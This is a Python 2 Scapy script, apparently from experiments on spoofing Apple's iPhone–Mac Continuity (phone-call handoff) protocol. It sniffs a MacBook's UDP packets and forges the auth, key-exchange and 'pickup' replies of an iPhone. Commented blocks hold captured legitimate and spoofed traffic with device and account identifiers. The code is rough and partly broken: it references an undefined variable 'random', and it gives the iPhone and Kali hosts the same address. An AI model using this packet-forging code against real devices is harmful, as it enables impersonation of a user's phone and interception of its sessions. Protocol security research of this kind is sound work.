import sys
import binascii
from scapy.all import *

iphone = "192.168.0.102"
kali = "192.168.0.102"
macbook = "192.168.0.105"
source = kali
destiny = iphone

#dport = 0
#sport = 61234
#counter = 0




#Auth
print "---Waiting for Auth package..."
myfilter = "udp and src %s and dst %s" % (macbook, kali)
pkt = sniff(filter=myfilter, count=1)[0]
responseSrcIp = pkt[IP].dst
responseDstIp = pkt[IP].src
responseSport = pkt[0].dport
responseDport = pkt[0].sport


print "---Auth package received"
pktLoad = binascii.hexlify(pkt.load)
print pktLoad
myLoad = pktLoad[:3] + '1' + pktLoad[4:]
pktToBeSent = IP(src=responseSrcIp, dst=responseDstIp)/UDP(sport=responseSport, dport=responseDport)/binascii.unhexlify(myLoad)
print "---Sending auth response"
print myLoad
#0f0 0 0100082112a442f741c34a29796e4f0a9ec04a8005000441c60000 LEGIT REQUEST
#0f0 1 0100082112a442f741c34a29796e4f0a9ec04a8005000441c60000 LEGIT RESPONSE
pkt = sr1(pktToBeSent) ##send(pktToBeSent)


print "---Key exchange package received"
pktLoad = binascii.hexlify(pkt.load)
print pktLoad
random0 = "4444"
myLoad = pktLoad[:3] + '1' + pktLoad[4:8] + '10' + pktLoad[10:58] + '8' + pktLoad[59:61] + '5' + pktLoad[62:64] + '0' + pktLoad[65:66] + random + '0000'
pktToBeSent = IP(src=responseSrcIp, dst=responseDstIp)/UDP(sport=responseSport, dport=responseDport)/binascii.unhexlify(myLoad)
print "---Send Key exchange response"
print myLoad
#0f0 0 0100 38 2112a442f741c34a29796e4f0a9ec04a0025000400000001 0 00 6 00 2 4 3131 4132363832412d434537302d344546462d383835352d4132463142463644383543448005000452b20000 LEGIT
#0f0 1 0100 10 2112a442f741c34a29796e4f0a9ec04a0025000400000001 8 00 5 00 0 4 52b2 0000 LEGIT RESPONSE
send(pktToBeSent)


print "---Waiting for the first 3 pickup packages..."
myfilter = "udp and src %s and src port %s and dst %s and dst port %s" % (macbook, pkt.sport, kali, pkt.dport)
pkt = sniff(filter=myfilter, count=3)[2] #Use the 3rd package
print "---Pickup packages received"
pktLoad = binascii.hexlify(pkt.load)
print pktLoad
signature1 = pktLoad[10:18]
signature2 = pktLoad[34:38]
signature3 = pktLoad[66:70]
signature4 = pktLoad[70:74]
random1 = "11111111"
random2 = "2222"
random3 = "33333333"
myLoad = '2004000400' + random1 + '00000000b002ffff' + random2 + '0000020405a0010303050101080a' + random3 + '0000000004020000'
pktToBeSent = IP(src=responseSrcIp, dst=responseDstIp)/UDP(sport=responseSport, dport=responseDport)/binascii.unhexlify(myLoad)
print "---Send pickup response"
print myLoad
#			    1                        2                                 3    4   
#2004000400 329a642c 00000000 b002ffff 5e1d 0000020405a0010303050101080a 38da 00a0 00000000  04020000
#2004000400 0f537940 00000000 b002ffff 9a7c 0000020405a0010303050101080a 2e83 153e 00000000  04020000
#               r1                      r2                                  r3
send(pktToBeSent)


print "---Waiting for pickup package #2..."
myfilter = "udp and src %s and src port %s and dst %s and dst port %s" % (macbook, pkt.sport, kali, pkt.dport)
pkt = sniff(filter=myfilter, count=1)[0] #Use the 3rd package
print "---Pickup package #2 received"
pktLoad = binascii.hexlify(pkt.load)
print pktLoad
signature5 = pktLoad[34:38]
signature6 = pktLoad[70:74]
random4 = "4444"
myLoad = '2004000400' + random1 + signature1 + '80101009' + random4 + '00000101080a' + random3 + signature3 + signature6 + '04020000'
pktToBeSent = IP(src=responseSrcIp, dst=responseDstIp)/UDP(sport=responseSport, dport=responseDport)/binascii.unhexlify(myLoad)
print "---Send pickup #2 response"
print myLoad
#               1       r1               5                                 3    6     r3    
#2004000400 329a642c 0f537941 b012ffff 8e90 0000020405a0010303050101080a 38da 03c7 2e83 153e 04020000 
#2004000400 0f537941 329a642d 80101009 f660 0000                0101080a 2e83 1593 38da 03c7
#               r1       1              r4                                   r3      3    6
send(pktToBeSent)


print "---Waiting for 2 pickup packages #3..."
myfilter = "udp and src %s and src port %s and dst %s and dst port %s" % (macbook, pkt.sport, kali, pkt.dport)
pkt1 = sniff(filter=myfilter, count=2)[0] #Use the 3rd package
print "---2 Pickup packages #3 received"
pktLoad = binascii.hexlify(pkt1.load)
print pktLoad
signature7 = pktLoad[34:38]
signature8 = pktLoad[70:74]
random4 = "4444"
myLoad = '2004000400' + random1 + signature1 + '80101009' + random4 + '00000101080a' + random3 + signature3 + signature6 + '04020000'
pktToBeSent1 = IP(src=responseSrcIp, dst=responseDstIp)/UDP(sport=responseSport, dport=responseDport)/binascii.unhexlify(myLoad)
print "---Send pickup #2 response"
print myLoad
#               1       r1               7                                 3    8     r3    
#2004000400 329a642d 0f537941 80101009 bde9 0000                0101080a 38da 03cb 2e83 1593
#2004000400 329a642d 0f537941 80181009 de59 0000                0101080a 38da 03cb 2e83 1593 00 30 0100013 2 000 8 4d6163204f53205800073130 2e3 1302e35000731344631363035000e4d6163426f6f6b50726f31312c33
#2004000400 0f537941 329a642d 80181009 0912 0000                0101080a 2e83 1593 38da 03c7 00 58 0100013 3 000 9 6950686f6e65204f53000539 2e3 22e310005313344313500096950686f6e65362c31000000040000040000000401000400000005020010 9f98e17cdeb94fd6ace0f940f97b8f72 030008000000000000003f LEGIT response
#2004000400 0f53799b 329a642d 80181009 281b 0000                0101080a 2e83 1593 38da 03c7 00 ca 0611 2123 040100240000000700270024 70772b138842 003c3 030384638364641                                                  2d3 3303234 2d3 44239 442d 42433634 2d3 43542433145324436443439 6163636f756e74636f6d2e6170706c652e707269766174652e616c6c6f792e70686f6e65636f6e74696e7569747934443533413432462d46364530 2d3 43736362d423445382d413441413737314139423636 94a921f23920e4ca00665a0be05b2fded6c7587b6863f3259cc8fc4fa8fa4d3b3c01555ee731be04b0aa20672b0fc6af95c9302102744d57b8a7d37d LEGIT response
#               r1       1              r4                                   r3      3    6
send(pktToBeSent1)







# def processPackage(pkt):
# 	global counter
# 	pktLoad = binascii.hexlify(pkt.load)

# 	if pkt.load.startswith("0f000100082112a442".decode('hex')):
# 		print "Auth package received"
# 		myLoad = pktLoad[:3] + '1' + pktLoad[4:]
# 		pktToBeSent = IP(src=pkt[IP].dst, dst=pkt[IP].src)/UDP(sport=pkt.dport, dport=pkt.sport)/binascii.unhexlify(myLoad)
# 		print "Send auth response"
# 		#0f0 0 0100082112a442f741c34a29796e4f0a9ec04a8005000441c60000 LEGIT REQUEST
# 		#0f0 1 0100082112a442f741c34a29796e4f0a9ec04a8005000441c60000 LEGIT RESPONSE
# 		send(pktToBeSent)
# 		pktToBeSent.show()
# 		print "DONE!"
# 	elif pkt.load.startswith("0f000100382112a442".decode('hex')):
# 		print "Key exchange package received"
# 		print pktLoad
# 		random = "4444"
# 		myLoad = pktLoad[:3] + '1' + pktLoad[4:8] + '10' + pktLoad[10:58] + '8' + pktLoad[59:61] + '5' + pktLoad[62:64] + '0' + pktLoad[65:66] + random + '0000'
# 		print myLoad
# 		#0f0 0 0100 38 2112a442f741c34a29796e4f0a9ec04a0025000400000001 0 00 6 00 2 4 3131 4132363832412d434537302d344546462d383835352d4132463142463644383543448005000452b20000 LEGIT
# 		#0f0 1 0100 10 2112a442f741c34a29796e4f0a9ec04a0025000400000001 8 00 5 00 0 4 52b2 0000 LEGIT RESPONSE
# 		pktToBeSent = IP(src=pkt[IP].dst, dst=pkt[IP].src)/UDP(sport=pkt.dport, dport=pkt.sport)/binascii.unhexlify(myLoad)
# 		print "Send Key exchange response"
# 		send(pktToBeSent)
# 		pktToBeSent.show()
# 		print "DONE!"
# 	elif counter < 3 and pkt.load.startswith("2004000400".decode('hex')):
# 		#print "Pickup package received"
# 		print pktLoad
# 		if counter == 2: # Respond after 3 packages were received
# 			random1 = "88888888"
# 			random2 = "4444"
# 			random3 = "88888888"
# 			#2004000400 329a642c 00000000 b002ffff 5e1d 0000020405a0010303050101080a 38da 00a0 00000000  04020000 LEGIT REQUEST
# 			#2004000400 0f537940 00000000 b002ffff 9a7c 0000020405a0010303050101080a 2e83 153e 00000000  04020000 LEGIT RESPONSE
# 			myLoad = '2004000400' + random1 + '00000000b002ffff' + random2 + '0000020405a0010303050101080a' + random3 + '0000000004020000'
# 			pktToBeSent = IP(src=pkt[IP].dst, dst=pkt[IP].src)/UDP(sport=pkt.dport, dport=pkt.sport)/binascii.unhexlify(myLoad)
# 			print "Send pickup response"
# 			send(pktToBeSent)
# 			pktToBeSent.show()
# 			print "DONE!"
# 		counter = counter + 1 # Wait for 3 packages
# 	elif counter == 3 and pkt.load.startswith("2004000400".decode('hex')):
# 		print "Pickup2 package received"
# 		print pktLoad
# 		#2004000400 329a642c 00000000 b002ffff 5e1d 0000020405a0010303050101080a 38da 00a0 00000000  04020000 
# 		#2004000400 0f537940 00000000 b002ffff 9a7c 0000020405a0010303050101080a 2e83 153e 00000000  04020000 
		
# 		#2004000400 329a642c 0f537941 b012ffff 8e90 0000020405a0010303050101080a 38da 03c7 2e83 153e 04020000 
# 		#2004000400 0f537941 329a642d 80101009 f660 0000                0101080a 2e83 1593 38da 03c7 

# 		#2004000400 329a642d 0f537941 80101009 bde9 0000                0101080a 38da 03cb 2e83 1593
# 		#2004000400 329a642d 0f537941 80181009 de59 0000                0101080a 38da 03cb 2e83 1593 00 30 0100013 2 000 8 4d6163204f53205800073130 2e3 1302e35000731344631363035000e4d6163426f6f6b50726f31312c33
# 		#2004000400 0f537941 329a642d 80181009 0912 0000                0101080a 2e83 1593 38da 03c7 00 58 0100013 3 000 9 6950686f6e65204f53000539 2e3 22e310005313344313500096950686f6e65362c31000000040000040000000401000400000005020010 9f98e17cdeb94fd6ace0f940f97b8f72 030008000000000000003f LEGIT response
# 		#2004000400 0f53799b 329a642d 80181009 281b 0000                0101080a 2e83 1593 38da 03c7 00 ca 0611 2123 040100240000000700270024 70772b138842 003c3 030384638364641                                                  2d3 3303234 2d3 44239 442d 42433634 2d3 43542433145324436443439 6163636f756e74636f6d2e6170706c652e707269766174652e616c6c6f792e70686f6e65636f6e74696e7569747934443533413432462d46364530 2d3 43736362d423445382d413441413737314139423636 94a921f23920e4ca00665a0be05b2fded6c7587b6863f3259cc8fc4fa8fa4d3b3c01555ee731be04b0aa20672b0fc6af95c9302102744d57b8a7d37d LEGIT response

# 		#2004000400 329a645f 0f53799b 80181006 9890 0000                0101080a 38da 03cc 2e83 1593 00 ca 0611 650a 040100240000000700270024 409f272703d4 003c3 741443636453844                                                  2d3 5303638 2d3 44643 442d 41463932 2d3 13335313136393634463345 6163636f756e74636f6d2e6170706c652e707269766174652e616c6c6f792e70686f6e65636f6e74696e7569747934443533413432462d46364530 2d3 43736362d423445382d413441413737314139423636 2497fb330ea7be9af123dd03ec6eb21ae727b515360b535e3acca1b4ad31a1610b3280541c032d714f33e79c8fdc807310a071ded9ba607b8130b548
# 		#2004000400 329a652b 0f537a67 80101000 bbcd 0000                0101080a 38da 03cc 2e83 1593
# 		#2004000400 0f537a67 329a645f 80101007 f502 0000                0101080a 2e83 1597 38da 03cb
# 		#2004000400 0f537a67 329a652b 80101001 f43a 0000                0101080a 2e83 1598 38da 03cc

# 		#2004000400 329a652b 0f537a67 80181000 e8fb 0000                0101080a 38da 03cf 2e83 1598 00b104002400240007002700240001 0001000000000000000037 41443636453844 2d3 53036382d344643442d414639322d3133353131363936344633453030384638364641 2d3 3303234 2d3 44239 442d 42433634 2d3 43542433145324436443439 6163636f756e74636f6d2e6170706c652e707269766174652e616c6c6f792e70686f6e65636f6e74696e7569747934443533413432462d46364530 2d3 43736362d423445382d413441413737314139423636
# 		#2004000400 0f537a67 329a652b 80181001 2171 0000                0101080a 2e83 1598 38da 03cc 00b104002400240007002700240001 0001000000000000000030 30384638364641 2d3 33032342d344239442d424336342d3435424331453244364434393741443636453844 2d3 5303638 2d3 44643 442d 41463932 2d3 13335313136393634463345 6163636f756e74636f6d2e6170706c652e707269766174652e616c6c6f792e70686f6e65636f6e74696e7569747934443533413432462d46364530 2d3 43736362d423445382d413441413737314139423636

# 		#2004000400 329a65de 0f537b1a 80100ffa ba63 0000                0101080a 38da 03d1 2e83 1598
# 		#2004000400 0f537b1a 329a65de 80100ffb f2d3 0000                0101080a 2e83 159c 38da 03cf

# 		#2004000400 329a65de 0f537b1a 80181000 e7a1 0000                0101080a 38da 03d3 2e83 159c 00a705002400240007002700240001 37414436364538442d35303638 2d344 64344 2d4 1463932 2d3 133353131363936344633453030384638364641 2d3 33032342d344239442d424336342d3435424331453244364434396163636f756e74636f6d2e6170706c652e707269766174652e616c6c6f792e70686f6e65636f6e74696e7569747934443533413432462d463645302d343736362d423445382d413441413737314139423636
# 		#2004000400 0f537b1a 329a65de 80181000 2019 0000                0101080a 2e83 159c 38da 03cf 00a705002400240007002700240001 30303846383646412d33303234 2d344 23944 2d4 2433634 2d3 435424331453244364434393741443636453844 2d3 53036382d344643442d414639322d3133353131363936344633456163636f756e74636f6d2e6170706c652e707269766174652e616c6c6f792e70686f6e65636f6e74696e7569747934443533413432462d463645302d343736362d423445382d413441413737314139423636

# 		#2004000400 329a6687 0f537bc3 80100ffa b90a 0000                0101080a 38da 03d4 2e83 159c
# 		#2004000400 0f537bc3 329a6687 80100ffa f17b 0000                0101080a 2e83 159f 38da 03d3

# 		#-------- LEGIT

# 		#2004000400 bebbb8ad 00000000 b002ffff 7d08 0000020405a0010303050101080a 38da d9ff 00000000  04020000 
# 		#2004000400 3d6d2573 00000000 b002ffff bf7a 0000020405a0010303050101080a 2e83 f053 00000000  04020000 
		
# 		#2004000400 bebbb8ad 3d6d2574 b012ffff f96a 0000020405a0010303050101080a 38da dbd4 2e83 f053 04020000 
# 		#2004000400 3d6d2574 bebbb8ae 80101009 62fe 00000101080a 2e83 f058       38da dbd4 
		
# 		#2004000400 bebbb8ae 3d6d2574 80101009 2916 0000                0101080a 38da dbd6 2e83 f058 
# 		#2004000400 bebbb8ae 3d6d2574 80181009 4986 0000                0101080a 38da dbd6 2e83 f058 00 30 0100013 2 000 8 4d6163204f53205800073130 2e3 1302e35000731344631363035000e4d6163426f6f6b50726f31312c33
# 		#2004000400 3d6d2574 bebbb8ae 80181009 c1c9 0000                0101080a 2e83 f058 38da dbd4 00 58 0100013 3 000 9 6950686f6e65204f53000539 2e3 22e310005313344313500096950686f6e65362c31000000040000040000000401000400000005020010 32143ca2d06841acabd275643b4be71b 030008000000000000003f LEGIT response
# 		#2004000400 3d6d25ce bebbb8ae 80181009 332b 0000                0101080a 2e83 f058 38da dbd4 00 ca 0611 209e 040100240000000700270024 23d57117b7c7 003c3 236413530463345 2d3 5424442 2d34 3735 442d 39443337 2d3 34243343737364238353742 6163636f756e74636f6d2e6170706c652e707269766174652e616c6c6f792e70686f6e65636f6e74696e75697479334435 42364444362d 36413633 2d34 383334 2d4 23243302d 3434423539433942333634351e402fea77d7de7fe4f484f2b948b2f296bdc657d239a45e745b807ad6e6291c5af852ff20bd128239933bdf965941daf100d97c867687f1f151d5ab LEGIT response2



# 		#------------------------------------------------------- SEPARATE LEGIT TRACE FROM SPOOFED TRACE ---------------------------------------------



# 		#2004000400 37828a7800000000 b002ffff 6c29 0000020405a0010303050101080a 1212 3b00 00000000 04020000 1st pickup legit request
# 		#2004000400 8888888800000000 b002ffff 4444 0000020405a0010303050101080a 8888 8888 00000000 04020000 MY RESPONSE
		
# 		#2004000400 37828a7888888889 b012ffff 49df 0000020405a0010303050101080a 1212 3b17 88888888 04020000 new LEGIT request

# 		#-------- FAKE

# 		#2004000400 78b4da6e00000000 b002ffff 0efb 0000020405a0010303050101080a 122b 3cfc 00000000 04020000 1st pickup legit request
# 		#2004000400 8888888800000000 b002ffff 4444 0000020405a0010303050101080a 8888 8888 00000000 04020000 MY RESPONSE

# 		#2004000400 78b4da6e88888889 b012ffff ecb1 0000020405a0010303050101080a 122b 3d12 88888888 04020000 new LEGIT request
# 	else:
# 		print "Unknown package received"
# 		pkt.show()
# 		#if pkt.haslayer(Raw):
# 			#send(IP(src=source, dst=iphone)/UDP(sport=sport, dport=dport)/s.load)
		

# print "bbb"




# myfilter = "udp and src %s and dst %s" % (macbookPris, kali)
# sniff(filter=myfilter, prn=processPackage)
